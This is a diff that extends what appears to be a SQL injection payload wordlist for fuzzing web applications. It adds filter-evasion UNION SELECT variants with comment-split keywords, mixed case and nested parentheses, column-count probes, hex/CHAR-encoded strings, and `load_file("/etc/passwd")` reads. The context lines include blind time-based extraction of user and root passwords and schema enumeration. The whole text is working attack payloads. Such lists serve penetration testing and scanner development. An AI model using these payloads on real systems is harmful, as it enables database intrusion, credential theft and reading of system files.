@@ -1,13 +1,26 @@
  or 1=1 --
- or 3=3 --
+  strcmp(left('password',1), 0x69) = 1 -- -
  ' OR union select case when 1=2 then 1 else 1 like 1 escape 11 end
  ' OR union select case when 1=2 then 1 else 1 like 1 escape 11 end --
  ' OR union select case when 1=2 then 1 else 1 like 1 escape 11 end -- - 
  ' OR union select case when 1=2 then 1 else 1 like 1 escape 11 end--
+ '/**/OR/**/SELECT/**/CHAR(0x66)
  AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END
  AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END --
  AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END -- -
  AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END--
+ AND SELECT 0x5045
+ AND SELECT 0x5045 --
+ AND SELECT 0x5045 -- -
+ AND SELECT 0x5045--
+ AND SELECT CHAR(0x66)
+ AND SELECT CHAR(0x66) --
+ AND SELECT CHAR(0x66) -- -
+ AND SELECT CHAR(0x66)--
+ AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+ AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) --
+ AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) -- -
+ AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
  AND SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
  AND UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
  AND UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
@@ -15,6 +28,10 @@
  AND benchmark(2000,md5(now())) --
  AND benchmark(2000,md5(now())) -- - 
  AND benchmark(2000,md5(now()))--
+ AND strcmp(left('password',1), 0x69) = 1 
+ AND strcmp(left('password',1), 0x69) = 1 -- 
+ AND strcmp(left('password',1), 0x69) = 1 -- -
+ AND strcmp(left('password',1), 0x69) = 1-- 
  AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)
  AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) --
  AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) -- -
@@ -23,15 +40,39 @@
  OR CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END --
  OR CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END -- -
  OR CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END--
+ OR SELECT 0x5045
+ OR SELECT 0x5045 --
+ OR SELECT 0x5045 -- -
+ OR SELECT 0x5045--
+ OR SELECT CHAR(0x66)
+ OR SELECT CHAR(0x66) --
+ OR SELECT CHAR(0x66) -- -
+ OR SELECT CHAR(0x66)--
+ OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+ OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) --
+ OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) -- -
+ OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
  OR benchmark(2000,md5(now()))
  OR benchmark(2000,md5(now())) --
  OR benchmark(2000,md5(now())) -- - 
  OR benchmark(2000,md5(now()))--
+ OR strcmp(left('password',1), 0x69) = 1
+ OR strcmp(left('password',1), 0x69) = 1 --
+ OR strcmp(left('password',1), 0x69) = 1 -- -
+ OR strcmp(left('password',1), 0x69) = 1--
  OR union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)
  OR union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) --
  OR union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) -- -
  OR union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)--
+ SELECT 0x5045
+ SELECT 0x5045 --
+ SELECT 0x5045 -- -
+ SELECT 0x5045--
+ SELECT CHAR(0x66) --
+ SELECT CHAR(0x66) -- - 
+ SELECT CHAR(0x66)--
  SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+ SELECT/**/0x5045
  UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
  UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
  and ''='
@@ -48,6 +89,16 @@
  and 'whatever' in ('whatever')
  and (EXISTS)
  and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
+ and /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/* 
+ and /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+ and /*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+ and /*union*/union/*select*/select+1,2,3,4,5,6,7/*
+ and /*union*/union/*select*/select+1,2,3,4,5,6/*
+ and /*union*/union/*select*/select+1,2,3,4,5/*
+ and /*union*/union/*select*/select+1,2,3,4/*
+ and /*union*/union/*select*/select+1,2,3/*
+ and /*union*/union/*select*/select+1,2/*
+ and /*union*/union/*select*/select+1/*
  and 0=0 #
  and 0=0 #"
  and 0=0 --
@@ -82,14 +133,142 @@
  and select if(1=1,(select 1 union select 2),2)--
  and sleep(__TIME__)#
  and sleep(__TIME__)='
+ and un/**/ion+sel/**/ect+1
+ and un/**/ion+sel/**/ect+1 --
+ and un/**/ion+sel/**/ect+1 -- -
+ and un/**/ion+sel/**/ect+1,2
+ and un/**/ion+sel/**/ect+1,2 --
+ and un/**/ion+sel/**/ect+1,2 -- -
+ and un/**/ion+sel/**/ect+1,2,3
+ and un/**/ion+sel/**/ect+1,2,3 --
+ and un/**/ion+sel/**/ect+1,2,3 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4
+ and un/**/ion+sel/**/ect+1,2,3,4 --
+ and un/**/ion+sel/**/ect+1,2,3,4 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5
+ and un/**/ion+sel/**/ect+1,2,3,4,5 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 --
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 -- -
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+ and un/**/ion+sel/**/ect+1,2,3,4,5,6--
+ and un/**/ion+sel/**/ect+1,2,3,4,5--
+ and un/**/ion+sel/**/ect+1,2,3,4--
+ and un/**/ion+sel/**/ect+1,2,3--
+ and un/**/ion+sel/**/ect+1,2--
+ and un/**/ion+sel/**/ect+1--
+ and unIon(((((((selEct(1))))))))
+ and unIon(((((((selEct(1)))))))) --
+ and unIon(((((((selEct(1)))))))) -- -
+ and unIon(((((((selEct(1))))))))--
+ and unIon(((((((selEct(1),(2))))))))
+ and unIon(((((((selEct(1),(2)))))))) --
+ and unIon(((((((selEct(1),(2)))))))) -- -
+ and unIon(((((((selEct(1),(2))))))))--
+ and unIon(((((((selEct(1),(2),(3))))))))
+ and unIon(((((((selEct(1),(2),(3)))))))) --
+ and unIon(((((((selEct(1),(2),(3)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4))))))))
+ and unIon(((((((selEct(1),(2),(3),(4)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+ and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
  and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)
  and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) --
  and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- - 
  and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)--
+ and union select load_file("/etc/passwd") 
+ and union select load_file("/etc/passwd") --
+ and union select load_file("/etc/passwd") -- - 
+ and union select load_file("/etc/passwd")--
+ and union(((((((select(1))))))))
+ and union(((((((select(1)))))))) --
+ and union(((((((select(1)))))))) -- -
+ and union(((((((select(1))))))))--
+ and union(((((((select(1),(2))))))))
+ and union(((((((select(1),(2)))))))) --
+ and union(((((((select(1),(2)))))))) -- -
+ and union(((((((select(1),(2))))))))--
+ and union(((((((select(1),(2),(3))))))))
+ and union(((((((select(1),(2),(3)))))))) --
+ and union(((((((select(1),(2),(3)))))))) -- -
+ and union(((((((select(1),(2),(3))))))))--
+ and union(((((((select(1),(2),(3),(4))))))))
+ and union(((((((select(1),(2),(3),(4)))))))) --
+ and union(((((((select(1),(2),(3),(4)))))))) -- -
+ and union(((((((select(1),(2),(3),(4))))))))--
+ and union(((((((select(1),(2),(3),(4),(5))))))))
+ and union(((((((select(1),(2),(3),(4),(5)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5))))))))--
+ and union(((((((select(1),(2),(3),(4),(5),(6))))))))
+ and union(((((((select(1),(2),(3),(4),(5),(6)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5),(6)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+ and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
  and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns
  and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns --
  and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns -- - 
  and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns--
+ and+5!=6
+ and+5!=6 --
+ and+5!=6 -- - 
+ and+5!=6--
  group by userid having 1=1--
  or ''='
  or '1'='1
@@ -102,6 +281,16 @@
  or 'unusual' = 'unusual'
  or 'whatever' in ('whatever')
  or (EXISTS)
+ or /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/* 
+ or /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+ or /*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+ or /*union*/union/*select*/select+1,2,3,4,5,6,7/*
+ or /*union*/union/*select*/select+1,2,3,4,5,6/*
+ or /*union*/union/*select*/select+1,2,3,4,5/*
+ or /*union*/union/*select*/select+1,2,3,4/*
+ or /*union*/union/*select*/select+1,2,3/*
+ or /*union*/union/*select*/select+1,2/*
+ or /*union*/union/*select*/select+1/*
  or 0=0 #
  or 0=0 #"
  or 0=0 --
@@ -129,10 +318,134 @@
  or select if(1=1,(select 1 union select 2),2)--
  or sleep(__TIME__)#
  or sleep(__TIME__)='
+ or un/**/ion+sel/**/ect+1
+ or un/**/ion+sel/**/ect+1 --
+ or un/**/ion+sel/**/ect+1 -- -
+ or un/**/ion+sel/**/ect+1,2
+ or un/**/ion+sel/**/ect+1,2 --
+ or un/**/ion+sel/**/ect+1,2 -- -
+ or un/**/ion+sel/**/ect+1,2,3
+ or un/**/ion+sel/**/ect+1,2,3 --
+ or un/**/ion+sel/**/ect+1,2,3 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4
+ or un/**/ion+sel/**/ect+1,2,3,4 --
+ or un/**/ion+sel/**/ect+1,2,3,4 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5
+ or un/**/ion+sel/**/ect+1,2,3,4,5 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 -- -
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 --
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 -- - 
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+ or un/**/ion+sel/**/ect+1,2,3,4,5,6--
+ or un/**/ion+sel/**/ect+1,2,3,4,5--
+ or un/**/ion+sel/**/ect+1,2,3,4--
+ or un/**/ion+sel/**/ect+1,2,3--
+ or un/**/ion+sel/**/ect+1,2--
+ or un/**/ion+sel/**/ect+1--
+ or unIon(((((((selEct(1))))))))
+ or unIon(((((((selEct(1)))))))) --
+ or unIon(((((((selEct(1)))))))) -- -
+ or unIon(((((((selEct(1))))))))--
+ or unIon(((((((selEct(1),(2))))))))
+ or unIon(((((((selEct(1),(2)))))))) --
+ or unIon(((((((selEct(1),(2)))))))) -- -
+ or unIon(((((((selEct(1),(2))))))))--
+ or unIon(((((((selEct(1),(2),(3))))))))
+ or unIon(((((((selEct(1),(2),(3)))))))) --
+ or unIon(((((((selEct(1),(2),(3)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4))))))))
+ or unIon(((((((selEct(1),(2),(3),(4)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+ or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
  or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)
  or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) --
  or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- - 
  or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)--
+ or union select load_file("/etc/passwd") 
+ or union select load_file("/etc/passwd") --
+ or union select load_file("/etc/passwd") -- - 
+ or union select load_file("/etc/passwd")--
+ or union(((((((select(1))))))))
+ or union(((((((select(1)))))))) --
+ or union(((((((select(1)))))))) -- -
+ or union(((((((select(1))))))))--
+ or union(((((((select(1),(2))))))))
+ or union(((((((select(1),(2)))))))) --
+ or union(((((((select(1),(2)))))))) -- -
+ or union(((((((select(1),(2))))))))--
+ or union(((((((select(1),(2),(3))))))))
+ or union(((((((select(1),(2),(3)))))))) --
+ or union(((((((select(1),(2),(3)))))))) -- -
+ or union(((((((select(1),(2),(3))))))))--
+ or union(((((((select(1),(2),(3),(4))))))))
+ or union(((((((select(1),(2),(3),(4)))))))) --
+ or union(((((((select(1),(2),(3),(4)))))))) -- -
+ or union(((((((select(1),(2),(3),(4))))))))--
+ or union(((((((select(1),(2),(3),(4),(5))))))))
+ or union(((((((select(1),(2),(3),(4),(5)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5))))))))--
+ or union(((((((select(1),(2),(3),(4),(5),(6))))))))
+ or union(((((((select(1),(2),(3),(4),(5),(6)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5),(6)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+ or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
  or username like char(37);
  select * from information_schema.tables--
  select 1 from pg_sleep(5) 
@@ -144,6 +457,9 @@
  select if(1=1,(select 1 union select 2),2) --
  select if(1=1,(select 1 union select 2),2) -- -
  select if(1=1,(select 1 union select 2),2)--
+ strcmp(left('password',1), 0x69) = 1
+ strcmp(left('password',1), 0x69) = 1 --
+ strcmp(left('password',1), 0x69) = 1--
  union all select @@version--
  union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)
  union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) --
@@ -284,6 +600,18 @@ $
 ' AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END --
 ' AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END -- -
 ' AND CASE WHEN sqlite_version() like '3.%' THEN 1 ELSE load_extension(1) END--
+' AND SELECT 0x5045
+' AND SELECT 0x5045 --
+' AND SELECT 0x5045 -- -
+' AND SELECT 0x5045--
+' AND SELECT CHAR(0x66)
+' AND SELECT CHAR(0x66) --
+' AND SELECT CHAR(0x66) -- -
+' AND SELECT CHAR(0x66)--
+' AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+' AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) --
+' AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) -- -
+' AND SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
 ' AND SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
 ' AND UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 ' AND UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
@@ -291,6 +619,10 @@ $
 ' AND benchmark(2000,md5(now())) --
 ' AND benchmark(2000,md5(now())) -- -
 ' AND benchmark(2000,md5(now()))--
+' AND strcmp(left('password',1), 0x69) = 1
+' AND strcmp(left('password',1), 0x69) = 1 --
+' AND strcmp(left('password',1), 0x69) = 1 -- -
+' AND strcmp(left('password',1), 0x69) = 1--
 ' AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)
 ' AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) --
 ' AND union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) -- -
@@ -303,6 +635,7 @@ $
 ' AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now()))) --
 ' AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now()))) -- -
 ' AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))--
+' HAVING 1=1 --
 ' OR (length(database()))=1
 ' OR (length(database()))=1 --
 ' OR (length(database()))=1 -- -
@@ -323,6 +656,18 @@ $
 ' OR IF(length((SELECT password FROM users WHERE login='root'))>5, SLEEP(5), 0) --
 ' OR IF(length((SELECT password FROM users WHERE login='root'))>5, SLEEP(5), 0) -- -
 ' OR IF(length((SELECT password FROM users WHERE login='root'))>5, SLEEP(5), 0)--
+' OR SELECT 0x5045
+' OR SELECT 0x5045 --
+' OR SELECT 0x5045 -- -
+' OR SELECT 0x5045--
+' OR SELECT CHAR(0x66)
+' OR SELECT CHAR(0x66) --
+' OR SELECT CHAR(0x66) -- -
+' OR SELECT CHAR(0x66)--
+' OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+' OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) --
+' OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) -- -
+' OR SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
 ' OR SELECT COUNT(*),concat(0x3a,0x3a,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1,1),0x3a,0x3a, FLOOR(RAND() * 2))a FROM INFORMATION_SCHEMA.COLUMNS GROUP BY a
 ' OR SELECT COUNT(*),concat(0x3a,0x3a,(SELECT database()),0x3a,0x3a, FLOOR(RAND() * 2))a FROM INFORMATION_SCHEMA.COLUMNS GROUP BY a
